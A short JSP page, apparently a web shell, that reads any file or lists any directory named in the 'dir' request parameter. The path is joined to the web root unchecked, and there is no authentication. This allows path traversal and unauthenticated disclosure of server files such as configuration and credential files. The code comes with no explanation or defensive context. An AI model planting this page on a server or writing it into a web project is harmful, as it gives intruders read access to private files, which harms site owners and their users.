<%
try {
    String action = request.getParameter("action");
    String dir = request.getParameter("dir");

    if (action == null || dir == null) {
        out.println("Specify action=read or action=list, and dir parameter");
        return;
    }

    java.io.File f = new java.io.File(application.getRealPath("/") + "/" + dir);

    if ("read".equals(action)) {
        if (f.exists() && f.isFile()) {
            java.io.BufferedReader br = new java.io.BufferedReader(new java.io.FileReader(f));
            String line;
            out.println("<pre>");
            while ((line = br.readLine()) != null) {
                out.println(line);
            }
            out.println("</pre>");
            br.close();
        } else {
            out.println("File not found or not readable.");
        }
    } else if ("list".equals(action)) {
        if (f.exists() && f.isDirectory()) {
            out.println("<pre>");
            for (java.io.File fi : f.listFiles()) {
                out.println(fi.getName());
            }
            out.println("</pre>");
        } else {
            out.println("Directory not found or not readable.");
        }
    }
} catch (Exception e) {
    out.println("Error: " + e.getMessage());
}
%>
